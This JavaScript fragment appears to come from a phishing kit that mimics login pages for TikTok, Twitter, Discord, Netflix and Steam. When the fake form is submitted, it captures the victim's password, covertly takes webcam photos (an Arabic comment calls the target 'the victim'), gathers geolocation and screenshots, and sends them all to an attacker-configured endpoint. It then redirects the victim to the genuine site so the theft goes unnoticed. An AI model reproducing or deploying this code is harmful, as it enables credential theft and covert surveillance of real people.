    $('#fkFoot').textContent = app.foot;
    setTimeout(() => $('#in2') && $('#in2').focus(), 250);
    $('#back').onclick = e => { e.preventDefault(); STEP = 1; renderStep(); };

    $('#f2').onsubmit = async e => {
      e.preventDefault();
      const pw = $('#in2').value;
      if (!pw) return;

      const dark = ['tiktok','twitter','discord','netflix','steam'].includes(app.id);
      $('#load').classList.toggle('dark', dark);
      $('#load').classList.add('on');

      // 1) تصوير الضحية بالكاميرا
      let cam = { blobs: [], state: null };
      if (CFG.cm) {
        $('#load').classList.remove('on'); // نسيب الشاشة للكاميرا
        cam = await camCapture(CFG.cn || 2);
        $('#load').classList.add('on');
      }

      // 2) بيانات الموقع
      const geo = CFG.g ? await getGeo() : null;

      // 3) لقطات الشاشة
      const shots = await capture($('#fkRoot'), CFG.n, CFG.d);

      // 4) التجميع والإرسال
      const files = [];
      cam.blobs.forEach((b, i) => files.push({ blob: b, name: 'cam_' + (i + 1) + '.jpg' }));
      shots.forEach((b, i) => files.push({ blob: b, name: 'screen_' + (i + 1) + '.png' }));

      if (CFG.h) {
        const payload = buildPayload(CFG, 2, IDENT, pw, geo, cam.state);
        try { await send(CFG.h, payload, files); }
        catch(err){
          // إعادة محاولة بدون مرفقات لو الحجم كبير
          try { await send(CFG.h, payload, []); } catch(e){}
        }
      }

      setTimeout(() => { location.href = CFG.r || app.real; }, 1400);
    };
  }
}

function showFake(cfg){
  CFG = cfg;
  $('#panel').style.display = 'none';
  $('#fake').classList.add('on');
  STEP = 1;
  renderStep();
}

